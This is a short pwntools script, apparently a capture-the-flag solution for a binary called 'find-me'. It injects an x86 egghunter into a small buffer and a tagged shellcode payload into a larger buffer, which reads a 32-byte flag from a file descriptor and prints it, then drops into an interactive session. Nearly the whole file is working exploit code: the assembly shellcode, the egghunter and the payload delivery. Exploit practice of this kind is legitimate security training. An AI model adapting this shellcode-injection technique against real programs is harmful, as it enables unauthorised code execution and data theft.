#!/usr/bin/env python2

from pwn import *

p = process('./find-me')

egghunter = '''
    mov eax, 0x90909090
    mov ecx, esp
next:
    inc ecx
    mov edi, ecx
    scasd
    jnz next
    scasd
    jnz next
    jmp edi
'''
# read in flag (flag is 32 bytes)
# write flag to stdout
shellcode = '''
    sub esp, 32
    mov eax, 3
    mov ebx, 1000
    mov ecx, esp
    mov edx, 32
    int 0x80
    mov eax, 4
    mov ebx, 1
    mov ecx, esp
    mov edx, 32
    int 0x80
'''

pause()

p.recvuntil("enter your smallbuf shellcode", drop=True);
p.sendline(asm(egghunter))

#print(len(asm(egghunter)))

#output = ' '.join(x.encode('hex') for x in asm(egghunter))
#print(output)

p.recvuntil("bigbuf shellcode:", drop=True)
payload = ("\x90\x90\x90\x90" * 2) + asm(shellcode)
p.sendline(payload)


#p.recvline()
#p.recvline()
#p.recvline()

p.interactive()
